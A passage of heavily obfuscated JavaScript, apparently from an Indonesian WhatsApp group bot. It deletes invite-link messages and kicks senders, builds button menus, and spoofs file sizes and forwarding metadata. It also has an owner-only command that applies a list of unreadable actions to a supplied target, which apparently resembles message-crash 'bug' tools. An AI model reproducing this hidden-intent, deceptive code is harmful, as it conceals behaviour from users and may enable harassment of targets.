        if (global['db'][_0x5d4417(0x576)][_0x5d4417(0x281) + 'de'] && _0x2a5309[_0x5d4417(0x66b)](global['db'][_0x5d4417(0x576)][_0x5d4417(0x281) + 'de'], !![]) && !_0x47f98c && !_0xedb653[_0x5d4417(0xe3e)])
            return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x5d4417(0x4ef) + _0x5d4417(0x1099) + _0x5d4417(0x431) + _0x5d4417(0xa84) + _0x5d4417(0x771) + _0x5d4417(0x49b) + _0x5d4417(0xdab) + _0x5d4417(0xad1) + _0x5d4417(0x799) + _0x5d4417(0xee2) + _0x5d4417(0x55a) + _0x5d4417(0x1da) + _0x5d4417(0x661) }, { 'quoted': _0xa27a38 });
        if (_0xedb653[_0x5d4417(0xe3e)] && db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]] && _0x2a5309[_0x5d4417(0x5fc)](db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x8b5)], !![]) && !_0x47f98c)
            return;
        if (_0xedb653[_0x5d4417(0xe3e)] && db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]] && _0x2a5309[_0x5d4417(0x105c)](db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0x10fc)], !![])) {
            var _0x1aa8ba = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
            if (_0x1aa8ba[_0x5d4417(0x8cc)](_0xedb653[_0x5d4417(0x22d)]) && !_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)] && _0xedb653[_0x5d4417(0xd6d)] && !_0xedb653[_0x5d4417(0x563)]) {
                var _0x3fcec9 = _0x2a5309[_0x5d4417(0x98d)](_0x5d4417(0x6c3) + _0x5d4417(0xab3) + _0x5d4417(0xa0a), await _0x57ed02[_0x5d4417(0xcec) + _0x5d4417(0x6aa)](_0xedb653[_0x5d4417(0x9e2)])), _0x1898bf = new RegExp(_0x3fcec9, 'i'), _0x1fafc0 = _0x1898bf[_0x5d4417(0x8cc)](_0xedb653[_0x5d4417(0x22d)]);
                if (_0x1fafc0)
                    return;
                let _0x517077 = _0xedb653[_0x5d4417(0x1185)][_0x5d4417(0x4d9) + 't'], _0x18daaf = _0xedb653[_0x5d4417(0x1185)]['id'];
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x5d4417(0x119e) + _0x5d4417(0x3fa) + _0x5d4417(0xfd5) + _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[0x8f4 + 0x8 * 0x10d + -0x115c] + (_0x5d4417(0xcab) + _0x5d4417(0xa47) + _0x5d4417(0xdcd) + _0x5d4417(0xe9a) + _0x5d4417(0x2f6) + _0x5d4417(0xdd5) + _0x5d4417(0x1063) + _0x5d4417(0x2b2) + _0x5d4417(0x71a)),
                    'mentions': [_0xedb653[_0x5d4417(0xeee)]]
                }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'delete': {
                        'remoteJid': _0xedb653[_0x5d4417(0x9e2)],
                        'fromMe': ![],
                        'id': _0x18daaf,
                        'participant': _0x517077
                    }
                }), await _0x2a5309[_0x5d4417(0x6c0)](sleep, 0x1305 + -0x9 * -0x3c1 + 0x16 * -0x239), await _0x57ed02[_0x5d4417(0x21d) + _0x5d4417(0x9ec) + _0x5d4417(0x10f4)](_0xedb653[_0x5d4417(0x9e2)], [_0xedb653[_0x5d4417(0xeee)]], _0x2a5309[_0x5d4417(0x6ea)]);
            }
        }
        if (_0xedb653[_0x5d4417(0xe3e)] && db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]] && _0x2a5309[_0x5d4417(0xe7c)](db[_0x5d4417(0x73a)][_0xedb653[_0x5d4417(0x9e2)]][_0x5d4417(0xfc6)], !![])) {
            var _0x1aa8ba = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
            if (_0x1aa8ba[_0x5d4417(0x8cc)](_0xedb653[_0x5d4417(0x22d)]) && !_0x47f98c && !_0xedb653[_0x5d4417(0xbf4)] && _0xedb653[_0x5d4417(0xd6d)] && !_0xedb653[_0x5d4417(0x563)]) {
                var _0x3fcec9 = _0x2a5309[_0x5d4417(0x368)](_0x5d4417(0x6c3) + _0x5d4417(0xab3) + _0x5d4417(0xa0a), await _0x57ed02[_0x5d4417(0xcec) + _0x5d4417(0x6aa)](_0xedb653[_0x5d4417(0x9e2)])), _0x1898bf = new RegExp(_0x3fcec9, 'i'), _0x1fafc0 = _0x1898bf[_0x5d4417(0x8cc)](_0xedb653[_0x5d4417(0x22d)]);
                if (_0x1fafc0)
                    return;
                let _0x4c1314 = _0xedb653[_0x5d4417(0x1185)][_0x5d4417(0x4d9) + 't'], _0x550684 = _0xedb653[_0x5d4417(0x1185)]['id'];
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'text': _0x5d4417(0x119e) + _0x5d4417(0x3fa) + _0x5d4417(0xfd5) + _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[0x1227 + 0x173e + -0x2965] + (_0x5d4417(0x11e0) + _0x5d4417(0xdca) + _0x5d4417(0x748) + _0x5d4417(0xed5) + _0x5d4417(0x652) + _0x5d4417(0x25c) + _0x5d4417(0xf33) + _0x5d4417(0x207) + _0x5d4417(0xd4c) + 'n!'),
                    'mentions': [_0xedb653[_0x5d4417(0xeee)]]
                }, { 'quoted': _0xedb653 }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'delete': {
                        'remoteJid': _0xedb653[_0x5d4417(0x9e2)],
                        'fromMe': ![],
                        'id': _0x550684,
                        'participant': _0x4c1314
                    }
                });
            }
        }
        _0xedb653[_0x5d4417(0xe3e)] && _0x2a5309[_0x5d4417(0x10a0)](db[_0x5d4417(0x576)][_0x5d4417(0x3b5) + 'i'], !![]) && (_0xedb653[_0x5d4417(0x22d)][_0x5d4417(0x3d3)](_0x2a5309[_0x5d4417(0x377)]) && !_0xedb653[_0x5d4417(0x563)] && await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], { 'text': _0x5d4417(0xb47) + _0x5d4417(0x286) + _0x5d4417(0xa39) + _0x5d4417(0x1b4) + _0x5d4417(0x4db) + _0x5d4417(0x1068) + _0x5d4417(0x811) + _0x5d4417(0xbc0) + _0x5d4417(0xcc1) + _0x5d4417(0xba7) + _0x5d4417(0x11cc) + _0x5d4417(0xa02) + _0x5d4417(0x6ed) + _0x5d4417(0xd20) + _0x5d4417(0x64e) + _0x5d4417(0x5ec) + _0x5d4417(0x307) + _0x5d4417(0x83b) + _0x5d4417(0x71f) + _0x5d4417(0xbf3) + _0x5d4417(0x58f) + _0x5d4417(0xbfa) + _0x5d4417(0xe13) + _0x5d4417(0x461) + _0x5d4417(0xdbc) + _0x5d4417(0xe1f) + _0x5d4417(0x1e1) + _0x5d4417(0x879) + _0x5d4417(0x7bf) + _0x5d4417(0x11c1) + _0x5d4417(0xa43) + _0x5d4417(0x10c9) + _0x5d4417(0xacd) + _0x5d4417(0x497) + _0x5d4417(0xb75) + _0x5d4417(0x323) }, { 'quoted': null }));
        if (!_0x3f9787) {
            let _0x4c8064 = list[_0x5d4417(0x49a)](_0x53bbbd => _0x53bbbd[_0x5d4417(0x82a)] == _0x2d5b6c[_0x5d4417(0xec1) + 'e']());
            _0x4c8064 && await _0xedb653[_0x5d4417(0x105d)](_0x4c8064[_0x5d4417(0xe08)]);
        }
        const _0x1ac933 = _0x567ab2 => {
            const _0x2bd256 = _0x5d4417;
            return _0x2bd256(0x98b) + _0x2bd256(0xf78) + _0x2bd256(0xfde) + _0x2a5309[_0x2bd256(0xa09)](_0x32fb46, _0x224056) + '*\x20' + _0x567ab2 + '\x0a';
        };
        function _0xcbd4eb() {
            const _0x339e09 = _0x5d4417, _0x4b31c9 = _0x2a5309[_0x339e09(0x10a5)], _0xfc3830 = 0x1 * -0x9e1 + -0x1 * 0x1ebc + 0x28a7;
            let _0x501d4e = '';
            for (let _0x548d4f = 0x139 * 0x11 + -0x1a11 * -0x1 + -0x2eda; _0x2a5309[_0x339e09(0x26b)](_0x548d4f, _0xfc3830); _0x548d4f++) {
                const _0x40a318 = Math[_0x339e09(0xe09)](_0x2a5309[_0x339e09(0x349)](Math[_0x339e09(0xdc9)](), _0x4b31c9[_0x339e09(0xf65)]));
                _0x501d4e += _0x4b31c9[_0x40a318];
            }
            return _0x501d4e;
        }
        function _0x2ac61a(_0x1cad30, _0x10e8a6) {
            const _0x2af23f = _0x5d4417;
            return _0x2a5309[_0x2af23f(0xa09)](Math[_0x2af23f(0xe09)](_0x2a5309[_0x2af23f(0x681)](Math[_0x2af23f(0xdc9)](), _0x2a5309[_0x2af23f(0x8b1)](_0x2a5309[_0x2af23f(0xa68)](_0x10e8a6, _0x1cad30), 0x124 * 0x4 + 0x1242 + 0x63 * -0x3b))), _0x1cad30);
        }
        const _0x458b9f = async _0x3acd47 => {
                const _0x453c01 = _0x5d4417;
                return _0x57ed02[_0x453c01(0x367) + 'e'](_0xedb653[_0x453c01(0x9e2)], {
                    'text': _0x3acd47,
                    'mentions': [_0xedb653[_0x453c01(0xeee)]],
                    'contextInfo': {
                        'externalAdReply': {
                            'title': botname,
                            'body': _0x453c01(0xa1b) + _0x453c01(0xc0e) + namaOwner,
                            'thumbnailUrl': global[_0x453c01(0xd55)][_0x453c01(0x105d)],
                            'sourceUrl': null
                        }
                    }
                }, { 'quoted': _0x5adcaa });
            }, _0x19401b = async (_0x4d4b21, _0x1a95c0 = []) => {
                const _0x51840c = _0x5d4417;
                let _0x5462b7 = await _0x2a5309[_0x51840c(0xac3)](prepareWAMessageMedia, { 'image': { 'url': global[_0x51840c(0xd55)][_0x51840c(0x10b0)] } }, { 'upload': _0x57ed02[_0x51840c(0xb6b) + _0x51840c(0x877)] });
                const _0x7654f5 = await _0x2a5309[_0x51840c(0x320)](generateWAMessageFromContent, _0x4d4b21, {
                    'ephemeralMessage': {
                        'message': {
                            'messageContextInfo': {
                                'deviceListMetadata': {},
                                'deviceListMetadataVersion': 0x2
                            },
                            'interactiveMessage': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0xce6)]({
                                'body': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0xeaf)][_0x51840c(0xce6)]({ 'text': _0x2a5309[_0x51840c(0x3c4)] }),
                                'contextInfo': { 'mentionedJid': _0x1a95c0 },
                                'carouselMessage': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0x46d) + _0x51840c(0xa35)][_0x51840c(0xce6)]({
                                    'cards': [
                                        {
                                            'header': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0x358)][_0x51840c(0xce6)]({
                                                'title': _0x51840c(0xff4) + _0x51840c(0x31e) + _0x51840c(0xbd9) + _0x51840c(0x9ba) + _0x51840c(0x5f7) + _0x51840c(0xb28) + _0x51840c(0xea6) + _0x51840c(0x547) + _0x51840c(0xb1a) + _0x51840c(0xeef) + _0x51840c(0x185) + _0x51840c(0xc69) + _0x51840c(0x830) + _0x51840c(0xeed) + _0x51840c(0xac5) + _0x51840c(0x373) + _0x51840c(0xfa3) + _0x51840c(0x9b4) + _0x51840c(0x994) + _0x51840c(0xf51) + _0x51840c(0xc01) + _0x51840c(0x7bc) + _0x51840c(0x767) + _0x51840c(0x111d) + _0x51840c(0x20c) + _0x51840c(0x451) + _0x51840c(0x375) + _0x51840c(0x573) + _0x51840c(0xc7a) + _0x51840c(0xfd3) + _0x51840c(0xf16) + _0x51840c(0x271) + _0x51840c(0x329) + _0x51840c(0x115b) + _0x51840c(0x113d) + '*',
                                                'hasMediaAttachment': !![],
                                                ..._0x5462b7
                                            }),
                                            'nativeFlowMessage': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0x721) + _0x51840c(0x37b)][_0x51840c(0xce6)]({
                                                'buttons': [{
                                                        'name': _0x2a5309[_0x51840c(0xe6d)],
                                                        'buttonParamsJson': _0x51840c(0x780) + _0x51840c(0xf19) + _0x51840c(0x3b6) + _0x51840c(0xc30) + global[_0x51840c(0x104c)] + (_0x51840c(0xde3) + _0x51840c(0xf64) + _0x51840c(0x8ca) + _0x51840c(0xed9) + '\x22}')
                                                    }]
                                            })
                                        },
                                        {
                                            'header': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0x358)][_0x51840c(0xce6)]({
                                                'title': _0x51840c(0xaf1) + _0x51840c(0x562) + _0x51840c(0x87a) + _0x51840c(0xa94) + _0x51840c(0x241) + _0x51840c(0x571) + _0x51840c(0x7a6) + _0x51840c(0xf85) + _0x51840c(0x752) + _0x51840c(0x7b9) + _0x51840c(0x20f) + _0x51840c(0x205) + _0x51840c(0x641) + _0x51840c(0x44f) + _0x51840c(0x5de) + _0x51840c(0x76c) + _0x51840c(0x11e8) + _0x51840c(0x88f) + _0x51840c(0xaea) + _0x51840c(0x8f0) + _0x51840c(0xbc6) + _0x51840c(0xda4) + _0x51840c(0x751) + _0x51840c(0x3f0) + _0x51840c(0x103f) + _0x51840c(0x106e) + _0x51840c(0x1137) + _0x51840c(0xf13) + _0x51840c(0x31a) + _0x51840c(0x213) + _0x51840c(0x628) + _0x51840c(0x1056) + _0x51840c(0x3f1) + _0x51840c(0x55b) + _0x51840c(0xfe1) + _0x51840c(0x2e1) + _0x51840c(0x404) + _0x51840c(0x80c) + _0x51840c(0x35d) + _0x51840c(0xf13) + _0x51840c(0x624) + _0x51840c(0xe24) + _0x51840c(0x2bd) + _0x51840c(0x4b2) + _0x51840c(0x965) + _0x51840c(0x2a7) + _0x51840c(0x400),
                                                'hasMediaAttachment': !![],
                                                ..._0x5462b7
                                            }),
                                            'nativeFlowMessage': proto[_0x51840c(0x37b)][_0x51840c(0x3d6) + _0x51840c(0xb18)][_0x51840c(0x721) + _0x51840c(0x37b)][_0x51840c(0xce6)]({
                                                'buttons': [{
                                                        'name': _0x2a5309[_0x51840c(0xe6d)],
                                                        'buttonParamsJson': _0x51840c(0x780) + _0x51840c(0xdf0) + _0x51840c(0x997) + _0x51840c(0xcc3) + global[_0x51840c(0x104c)] + (_0x51840c(0xde3) + _0x51840c(0xf64) + _0x51840c(0x8ca) + _0x51840c(0xed9) + '\x22}')
                                                    }]
                                            })
                                        }
                                    ]
                                })
                            })
                        }
                    }
                }, {
                    'userJid': _0xedb653[_0x51840c(0xeee)],
                    'quoted': _0x3fcf94
                });
                await _0x57ed02[_0x51840c(0xa9a) + 'ge'](_0x4d4b21, _0x7654f5[_0x51840c(0x2f3)], { 'messageId': _0x7654f5[_0x51840c(0x1185)]['id'] });
            };
        switch (_0x224056) {
        case _0x2a5309[_0x5d4417(0xd27)]: {
                let _0x59e4c9 = _0x5d4417(0xf15) + _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[-0xda * -0x2a + -0x4d5 * 0x5 + -0xb9b] + (_0x5d4417(0x499) + _0x5d4417(0xd4e) + _0x5d4417(0x1053) + _0x5d4417(0x1074) + _0x5d4417(0x11ac) + _0x5d4417(0xbb4) + _0x5d4417(0xc66) + _0x5d4417(0x785) + _0x5d4417(0x1d3) + _0x5d4417(0x697) + _0x5d4417(0x6c5) + _0x5d4417(0xe6e) + _0x5d4417(0x5aa) + _0x5d4417(0x703) + _0x5d4417(0x6f4) + _0x5d4417(0x5b0) + _0x5d4417(0x992) + _0x5d4417(0x86e) + _0x5d4417(0x475) + _0x5d4417(0x57f) + _0x5d4417(0xc08) + _0x5d4417(0x1c4) + _0x5d4417(0x8be) + _0x5d4417(0x69f) + _0x5d4417(0xd7b) + _0x5d4417(0xc72) + _0x5d4417(0x6e7) + _0x5d4417(0x5e9) + _0x5d4417(0xc11) + _0x5d4417(0xf8d) + _0x5d4417(0x353) + _0x5d4417(0x8ee) + _0x5d4417(0xdea) + _0x5d4417(0x255) + _0x5d4417(0x6f5) + _0x5d4417(0x639) + _0x5d4417(0x113f) + _0x5d4417(0xcd2) + _0x5d4417(0xf99) + _0x5d4417(0x9bb) + _0x5d4417(0xb6c) + _0x5d4417(0xbe7) + _0x5d4417(0x1081) + _0x5d4417(0x1044) + _0x5d4417(0x1d8) + _0x5d4417(0xcb1) + _0x5d4417(0x8f9) + '\x20');
                const _0x3fa508 = [
                        {
                            'buttonId': _0x5d4417(0xe59),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x7b2)] },
                            'type': 0x1
                        },
                        {
                            'buttonId': _0x5d4417(0x57e),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x7e9)] },
                            'type': 0x1
                        }
                    ], _0x4e9d89 = {
                        'footer': _0x5d4417(0x3dc) + _0x5d4417(0x950),
                        'buttons': _0x3fa508,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x2ee)]),
                        'fileName': _0x5d4417(0x414) + _0x5d4417(0x38a) + _0x5d4417(0xc54) + _0x5d4417(0x995),
                        'mimetype': _0x2a5309[_0x5d4417(0xf14)],
                        'fileLength': 0x5f5e0ff,
                        'caption': _0x59e4c9,
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]],
                            'forwardedNewsletterMessageInfo': {
                                'newsletterJid': global[_0x5d4417(0x754)],
                                'newsletterName': global[_0x5d4417(0x518) + 'n']
                            },
                            'externalAdReply': {
                                'title': botname + _0x5d4417(0x5c5) + versi,
                                'body': _0x5d4417(0x9e5),
                                'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x2a0)],
                                'sourceUrl': linkSaluran,
                                'mediaType': 0x1,
                                'renderLargerThumbnail': !![]
                            }
                        }
                    }, _0x50db64 = [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x8bf)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0x2aa)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0xc06)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x4b3)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xbb7)],
                                                    'description': _0x2a5309[_0x5d4417(0xadc)],
                                                    'id': _0x5d4417(0xe59)
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x41b)],
                                                    'description': _0x2a5309[_0x5d4417(0x90f)],
                                                    'id': _0x5d4417(0xdb9)
                                                }
                                            ]
                                        }]
                                })
                            },
                            'viewOnce': !![]
                        }];
                return _0x4e9d89[_0x5d4417(0xdda)][_0x5d4417(0x706)](..._0x50db64), _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], _0x4e9d89, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x672)]: {
                let _0x300615 = _0x5d4417(0xae7) + _0x5d4417(0x6ff) + _0x5d4417(0x444) + _0x5d4417(0x10fe) + _0x5d4417(0x1051) + _0xedb653[_0x5d4417(0xeee)][_0x5d4417(0xc6c)]('@')[-0x643 + -0x6d3 * -0x1 + -0x90] + (_0x5d4417(0x278) + _0x5d4417(0x11d7)) + global[_0x5d4417(0xe8a)] + (_0x5d4417(0x1083) + _0x5d4417(0x11f9) + _0x5d4417(0xec5)) + (_0x57ed02[_0x5d4417(0x425)] ? _0x2a5309[_0x5d4417(0x700)] : _0x2a5309[_0x5d4417(0x707)]) + (_0x5d4417(0x759) + _0x5d4417(0xb81) + _0x5d4417(0x10ef) + _0x5d4417(0xaac) + _0x5d4417(0x34d)) + _0x2a5309[_0x5d4417(0x5ca)](runtime, os[_0x5d4417(0x75e)]()) + (_0x5d4417(0x88d) + _0x5d4417(0x1045)) + (_0x47f98c ? _0x2a5309[_0x5d4417(0x688)] : _0x73fd3b ? _0x2a5309[_0x5d4417(0x1117)] : _0x2a5309[_0x5d4417(0x2e9)]) + (_0x5d4417(0x76a) + _0x5d4417(0x10af) + _0x5d4417(0x19e) + _0x5d4417(0x20a) + _0x5d4417(0xcb4) + _0x5d4417(0x5d9) + _0x5d4417(0xa29) + _0x5d4417(0x70a) + _0x5d4417(0xe3d) + _0x5d4417(0x496) + _0x5d4417(0x983) + _0x5d4417(0x1075) + _0x5d4417(0x1034) + _0x5d4417(0x291) + _0x5d4417(0x19f) + _0x5d4417(0x94c) + _0x5d4417(0x238) + _0x5d4417(0x11cd) + _0x5d4417(0x1b9) + _0x5d4417(0x10bb) + _0x5d4417(0x224) + _0x5d4417(0x815) + _0x5d4417(0x116e) + _0x5d4417(0x79a) + _0x5d4417(0xe4f) + _0x5d4417(0x4f5) + _0x5d4417(0x87e) + _0x5d4417(0xaa3) + _0x5d4417(0x70d) + _0x5d4417(0x7d7) + _0x5d4417(0x99d) + _0x5d4417(0xf4f) + _0x5d4417(0x2f9) + _0x5d4417(0x118c) + _0x5d4417(0xc58) + _0x5d4417(0xa42) + _0x5d4417(0xa38) + _0x5d4417(0x1100) + _0x5d4417(0x116b) + _0x5d4417(0xcd1) + _0x5d4417(0x840) + _0x5d4417(0x41a) + _0x5d4417(0x2ad) + _0x5d4417(0xa85) + _0x5d4417(0xdc8) + _0x5d4417(0x538) + _0x5d4417(0xbf5) + _0x5d4417(0xd7e) + _0x5d4417(0x8c7) + _0x5d4417(0xc70) + _0x5d4417(0x729) + _0x5d4417(0x944) + _0x5d4417(0xc68) + _0x5d4417(0xd7e) + _0x5d4417(0xdb4) + _0x5d4417(0x734) + _0x5d4417(0xd94) + _0x5d4417(0x67c) + _0x5d4417(0x589) + _0x5d4417(0x4b1) + _0x5d4417(0x360) + _0x5d4417(0xa2d) + _0x5d4417(0x5a6) + _0x5d4417(0xa10) + _0x5d4417(0x7ad) + _0x5d4417(0xd2a) + _0x5d4417(0x211) + _0x5d4417(0x360) + _0x5d4417(0xc7b) + _0x5d4417(0x3a8) + _0x5d4417(0xe6a) + _0x5d4417(0xb7a) + _0x5d4417(0x263) + _0x5d4417(0xd8a) + _0x5d4417(0x8d1) + _0x5d4417(0x701) + _0x5d4417(0x6f1) + _0x5d4417(0xc58) + _0x5d4417(0x21c) + _0x5d4417(0x5b9) + _0x5d4417(0x3e9) + _0x5d4417(0x873) + _0x5d4417(0xd02) + _0x5d4417(0xdc4) + _0x5d4417(0x8cd) + _0x5d4417(0x328) + _0x5d4417(0xcdc) + _0x5d4417(0x328) + _0x5d4417(0xe8d) + _0x5d4417(0x2ad) + _0x5d4417(0x9cf) + _0x5d4417(0xb78) + _0x5d4417(0x8be) + _0x5d4417(0xe7b) + _0x5d4417(0x4bf) + _0x5d4417(0x74b) + _0x5d4417(0x89e) + _0x5d4417(0x801) + _0x5d4417(0x794) + _0x5d4417(0x11c5) + (_0x5d4417(0x9e8) + _0x5d4417(0x8bb)));
                await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0x3dc) + _0x5d4417(0x950),
                    'buttons': [
                        {
                            'buttonId': _0x5d4417(0xe59),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xbb7)] },
                            'type': 0x1
                        },
                        {
                            'buttonId': _0x5d4417(0x57e),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x7e9)] },
                            'type': 0x1
                        }
                    ],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x2ee)]),
                    'fileName': _0x5d4417(0x414) + _0x5d4417(0x38a) + _0x5d4417(0xc54) + _0x5d4417(0x87b),
                    'mimetype': _0x2a5309[_0x5d4417(0xf14)],
                    'fileLength': 0x5f5e0ff,
                    'caption': _0x300615,
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]],
                        'forwardedNewsletterMessageInfo': {
                            'newsletterJid': global[_0x5d4417(0x754)],
                            'newsletterName': global[_0x5d4417(0x518) + 'n']
                        },
                        'externalAdReply': {
                            'title': botname + _0x5d4417(0x5c5) + versi,
                            'body': _0x5d4417(0x9e5),
                            'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x2a0)],
                            'sourceUrl': linkSaluran,
                            'mediaType': 0x1,
                            'renderLargerThumbnail': !![]
                        }
                    }
                });
            }
            break;
        case _0x2a5309[_0x5d4417(0xf97)]: {
                if (!_0x73fd3b)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xb1f)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbaa)](_0x1ac933, _0x2a5309[_0x5d4417(0xaa8)]));
                global[_0x5d4417(0x594)] = _0x156b97;
                let _0x59beaf = _0x2a5309[_0x5d4417(0x1202)];
                const _0x38b7d0 = [
                        {
                            'buttonId': _0x5d4417(0xe59),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xbb7)] },
                            'type': 0x1
                        },
                        {
                            'buttonId': _0x5d4417(0x57e),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x7e9)] },
                            'type': 0x1
                        }
                    ], _0x2ba3dd = {
                        'footer': _0x5d4417(0x3dc) + _0x5d4417(0x950),
                        'buttons': _0x38b7d0,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x2ee)]),
                        'fileName': _0x5d4417(0x414) + _0x5d4417(0x38a) + _0x5d4417(0xc54) + _0x5d4417(0x995),
                        'mimetype': _0x2a5309[_0x5d4417(0xf14)],
                        'fileLength': 0x5f5e0ff,
                        'caption': _0x59beaf,
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]],
                            'forwardedNewsletterMessageInfo': {
                                'newsletterJid': global[_0x5d4417(0x754)],
                                'newsletterName': global[_0x5d4417(0x518) + 'n']
                            },
                            'externalAdReply': {
                                'title': botname + _0x5d4417(0x5c5) + versi,
                                'body': _0x5d4417(0x9e5),
                                'thumbnailUrl': global[_0x5d4417(0xd55)][_0x5d4417(0x2a0)],
                                'sourceUrl': linkSaluran,
                                'mediaType': 0x1,
                                'renderLargerThumbnail': !![]
                            }
                        }
                    }, _0x5f2b08 = [{
                            'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x4c1)] },
                            'type': 0x4,
                            'nativeFlowInfo': {
                                'name': _0x2a5309[_0x5d4417(0xdc6)],
                                'paramsJson': JSON[_0x5d4417(0x78f)]({
                                    'title': _0x2a5309[_0x5d4417(0x897)],
                                    'sections': [{
                                            'title': _0x2a5309[_0x5d4417(0x9f0)],
                                            'highlight_label': _0x2a5309[_0x5d4417(0x47c)],
                                            'rows': [
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x6f0)],
                                                    'description': _0x2a5309[_0x5d4417(0x913)],
                                                    'id': _0x32fb46 + _0x5d4417(0x2dd) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xf5e)],
                                                    'description': _0x2a5309[_0x5d4417(0x9d2)],
                                                    'id': _0x32fb46 + _0x5d4417(0x1f8) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x9ae)],
                                                    'description': _0x2a5309[_0x5d4417(0x73f)],
                                                    'id': _0x32fb46 + _0x5d4417(0x90e) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0xa11)],
                                                    'description': _0x2a5309[_0x5d4417(0x11e3)],
                                                    'id': _0x32fb46 + _0x5d4417(0x1110) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x2e2)],
                                                    'description': _0x2a5309[_0x5d4417(0xe9e)],
                                                    'id': _0x32fb46 + _0x5d4417(0xa7f) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x9a2)],
                                                    'description': _0x2a5309[_0x5d4417(0x8c4)],
                                                    'id': _0x32fb46 + _0x5d4417(0x78b) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x4ca)],
                                                    'description': _0x2a5309[_0x5d4417(0x614)],
                                                    'id': _0x32fb46 + _0x5d4417(0x5f6) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x83e)],
                                                    'description': _0x2a5309[_0x5d4417(0xc07)],
                                                    'id': _0x32fb46 + _0x5d4417(0x2c0) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x11b5)],
                                                    'description': _0x2a5309[_0x5d4417(0x8f2)],
                                                    'id': _0x32fb46 + _0x5d4417(0x11d9) + _0x156b97
                                                },
                                                {
                                                    'title': _0x2a5309[_0x5d4417(0x91a)],
                                                    'description': _0x2a5309[_0x5d4417(0xf28)],
                                                    'id': _0x32fb46 + _0x5d4417(0xe87) + _0x156b97
                                                },
